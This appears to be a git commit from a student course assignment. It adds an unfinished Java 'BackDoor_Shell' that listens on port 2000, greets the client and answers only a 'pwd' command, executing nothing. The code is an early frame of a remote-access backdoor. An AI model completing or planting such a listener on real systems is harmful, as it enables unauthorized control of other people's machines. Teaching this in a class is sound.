335d4b82d81ef8358d9742e3372abe95df0f721b
Pedro Nunez <peter.nunez1029@gmail.com>
2023-05-01 14:40:18 -0700

    new update

--- CSC123/CSC123-Assignment7/BackDoor_Shell.java
+++ CSC123/CSC123-Assignment7/BackDoor_Shell.java
@@ -1,8 +1,61 @@
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.IOError;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.net.ServerSocket;
+import java.net.Socket;
 
 public class BackDoor_Shell {
 
 	public static void main(String[] args) {
 		// TODO Auto-generated method stub
+
+		try {
+			ServerSocket server=new ServerSocket(2000);
+			Socket client=server.accept();
+			String workingDir=System.getProperty("user.dir");
+			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
+			System.out.println();
+			
+			//File workDirectory=System.getProperty(null)
+			
+			InputStream in=client.getInputStream();
+			OutputStream out=client.getOutputStream();
+			
+			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
+			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
+		
+			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
+			
+			while(true) {
+				
+				writer.write(workingDir+prompt);
+				writer.flush();
+				String clientCommand=reader.readLine();
+				
+				if(clientCommand.equalsIgnoreCase("pwd")) {
+					writer.write("\nWorking directory is: "+workingDir+"\n\n");
+				}
+				else if(clientCommand.equalsIgnoreCase("dir")){
+					writer.write("\nShould list files in the current directory \n\n");
+				}
+				
+				
+			}
+			
+			
+
+		}
+		catch(IOException e) {
+			e.printStackTrace();
+		}
+		
+
+	}
 
 	}
 
